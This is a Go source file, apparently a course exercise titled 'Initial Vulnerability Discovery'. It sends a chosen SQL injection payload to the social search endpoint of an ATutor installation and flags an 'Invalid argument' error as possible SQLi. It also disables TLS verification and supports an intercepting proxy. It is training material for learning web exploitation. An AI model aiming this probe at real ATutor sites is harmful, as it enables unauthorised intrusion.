package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

// Ex 3.2.1.1 - Initial Vulnerability Discovery

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func printInfo(message string) {
	log.Println("[*] " + message)
}

func printSuccess(message string) {
	log.Println("\033[32m[+] \033[0m" + message)
}

func printFailure(message string) {
	log.Println("\033[31m[-] \033[0m" + message)
}

func sendGetRequest(requestURL string) string {
	// create our HTTP GET request
	req, err := http.NewRequest(http.MethodGet, requestURL, nil)
	if err != nil {
		log.Fatalln("[-] Failed to create HTTP request: ", err)
	}

	printInfo("Sending HTTP request to: " + requestURL)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln("[-] Failed to send HTTP request: ", err)
	}
	defer resp.Body.Close()
	printSuccess("Got HTTP response!")

	// get HTTP status code
	printInfo(fmt.Sprintf("HTTP response status code: %d", resp.StatusCode))

	// get HTTP response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln("[-] Failed to read HTTP response body: ", err)
	}
	printInfo("Response body: ")
	bodyString := string(body)
	fmt.Println(bodyString)

	// get HTTP response headers
	printInfo("Response headers: ")
	//respHeaders := make(map[string]string)
	for headerKey, headerValues := range resp.Header {
		fmt.Printf("\t%s = %s\n", headerKey, strings.Join(headerValues, ", "))
	}

	fmt.Println("")
	return bodyString
}

func sendSearchFriendsSQLi(ip string, sqliPayload string) {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, sqliPayload)

	// send the request
	body := sendGetRequest(requestURL)

	// regex for Invalid argument
	match, _ := regexp.MatchString("Invalid argument", body)
	if match {
		printSuccess("Error found in application response. Possible SQLi found!")
	} else {
		printFailure("No errors found in application response.")
	}
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 3 {
		printFailure(fmt.Sprintf("usage: %s <target> <payload>", os.Args[0]))
		printFailure(fmt.Sprintf("eg: %s 192.168.121.103 \"AAAA'\"", os.Args[0]))
		os.Exit(1)
	}

	ip := os.Args[1]
	payload := os.Args[2]

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{Transport: tr}

	sendSearchFriendsSQLi(ip, payload)
}
